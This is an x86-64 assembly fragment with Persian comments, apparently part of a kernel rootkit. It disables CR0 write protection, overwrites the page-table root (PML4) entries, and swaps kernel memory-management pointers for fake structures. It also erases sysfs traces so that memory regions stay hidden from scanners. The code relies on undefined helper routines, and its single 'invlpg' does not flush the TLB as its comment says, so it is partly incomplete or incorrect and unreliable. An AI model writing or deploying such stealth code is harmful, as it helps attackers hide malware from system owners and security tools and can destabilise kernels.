section .text
global direct_pml4_mod, hide_memory_ranges

; دستکاری مستقیم PML4 برای پنهان‌سازی حافظه
direct_pml4_mod:
    mov rax, cr3
    and rax, ~0xFFF         ; آدرس PML4
    mov rdi, rax
    
    ; غیرفعال کردن WP
    mov rax, cr0
    and rax, 0xFFFEFFFF     ; پاک کردن بیت WP
    mov cr0, rax
    
    ; تغییر مدخل‌های PML4
    mov rcx, 512
    lea rsi, [rel new_pml4_entries]
.modify_loop:
    mov rax, [rsi]
    mov [rdi], rax
    add rdi, 8
    add rsi, 8
    loop .modify_loop
    
    ; فعال کردن مجدد WP
    mov rax, cr0
    or rax, 0x10000         ; تنظیم بیت WP
    mov cr0, rax
    
    invlpg [0]              ; اعتبارسنجی TLB
    ret

; پنهان‌سازی محدوده‌های حافظه از اسکنرها
hide_memory_ranges:
    mov rdi, [rel mem_range_start]
    mov rsi, [rel mem_range_end]
    
    ; تغییر مجوزهای صفحه
    call modify_page_attributes
    
    ; دستکاری ساختارهای مدیریت حافظه هسته
    lea rax, [rel fake_mem_struct]
    mov [kernel_mem_struct_ptr], rax
    
    ; پاک‌سازی ردپا در sysfs
    mov rdi, sysfs_path
    call clear_sysfs_entries
    
    ret
    